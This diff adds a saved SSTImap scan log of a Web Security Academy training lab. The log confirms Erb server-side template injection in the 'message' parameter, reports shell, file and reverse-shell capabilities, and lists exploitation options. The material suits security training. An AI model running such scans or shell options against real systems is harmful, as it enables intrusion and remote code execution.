@@ -1,0 +1,73 @@
+[34m[*][0m Loaded plugins by categories: languages: 5; engines: 17; generic: 3; legacy_engines: 2
+[34m[*][0m Loaded request body types: 4
+
+[93m[*][0m Scanning url: https://0a9a007b03316c22819a537300960027.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
+[33m[*][0m Testing if Query parameter 'message' is injectable
+[94m[*][0m Cheetah plugin is testing rendering with tag '*'
+[34m[*][0m Cheetah plugin is testing }* code context escape with 6 variations
+[34m[*][0m Cheetah plugin is testing ]* code context escape with 6 variations
+[34m[*][0m Cheetah plugin is testing )* code context escape with 6 variations
+[94m[*][0m Cheetah plugin is testing blind injection
+[33m[!][0m Blind injection timing varies too much. Increase the timing to avoid false positives.
+[34m[*][0m Cheetah plugin is testing }* code context escape with 6 variations
+[33m[*][0m Cheetah plugin has detected possible blind injection
+[31m[-][0m Possible blind injection turned out to be false positive
+[33m[*][0m Cheetah plugin has detected possible blind injection
+[31m[-][0m Possible blind injection turned out to be false positive
+[34m[*][0m Cheetah plugin is testing ]* code context escape with 6 variations
+[33m[*][0m Cheetah plugin has detected possible blind injection
+[31m[-][0m Possible blind injection turned out to be false positive
+[34m[*][0m Cheetah plugin is testing )* code context escape with 6 variations
+[33m[*][0m Cheetah plugin has detected possible blind injection
+[31m[-][0m Possible blind injection turned out to be false positive
+[94m[*][0m Dot plugin is testing rendering with tag '*'
+[34m[*][0m Dot plugin is testing ;}}*{{1; code context escape with 6 variations
+[94m[*][0m Dot plugin is testing blind injection
+[33m[!][0m Blind injection timing varies too much. Increase the timing to avoid false positives.
+[34m[*][0m Dot plugin is testing ;}}*{{1; code context escape with 6 variations
+[33m[*][0m Dot plugin has detected possible blind injection
+[31m[-][0m Possible blind injection turned out to be false positive
+[94m[*][0m Dust plugin is testing rendering
+[94m[*][0m Dust plugin is testing blind injection
+[33m[!][0m Blind injection timing varies too much. Increase the timing to avoid false positives.
+[94m[*][0m Ejs plugin is testing rendering with tag '*'
+[34m[*][0m Ejs plugin is testing %>*<%# code context escape with 6 variations
+[94m[*][0m Ejs plugin is testing blind injection
+[33m[!][0m Blind injection timing varies too much. Increase the timing to avoid false positives.
+[34m[*][0m Ejs plugin is testing %>*<%# code context escape with 6 variations
+[33m[*][0m Ejs plugin has detected possible blind injection
+[31m[-][0m Possible blind injection turned out to be false positive
+[33m[*][0m Ejs plugin has detected possible blind injection
+[31m[-][0m Possible blind injection turned out to be false positive
+[33m[*][0m Ejs plugin has detected possible blind injection
+[31m[-][0m Possible blind injection turned out to be false positive
+[94m[*][0m Erb plugin is testing rendering with tag '*'
+[32m[+][0m Erb plugin has confirmed injection with tag '*'
+[92m[+][0m SSTImap identified the following injection point:
+
+  Query parameter: message
+  Engine: Erb
+  Injection: *
+  Context: text
+  OS: x86_64-linux-gnu
+  Technique: render
+  Capabilities:
+
+    Shell command execution: [92mok[0m
+    Bind and reverse shell: [92mok[0m
+    File write: [92mok[0m
+    File read: [92mok[0m
+    Code evaluation: [92mok[0m, ruby code
+
+[92m[+][0m Rerun SSTImap providing one of the following options:
+    [92m--interactive[0m                Run SSTImap in interactive mode to switch between exploitation modes without losing progress.
+    --os-shell                   Prompt for an interactive operating system shell.
+    --os-cmd                     Execute an operating system command.
+    --eval-shell                 Prompt for an interactive shell on the template engine base language.
+    --eval-cmd                   Evaluate code in the template engine base language.
+    --tpl-shell                  Prompt for an interactive shell on the template engine.
+    --tpl-cmd                    Inject code in the template engine.
+    --bind-shell PORT            Connect to a shell bind to a target port.
+    --reverse-shell HOST PORT    Send a shell back to the attacker's port.
+    --upload LOCAL REMOTE        Upload files to the server.
+    --download REMOTE LOCAL      Download remote files.
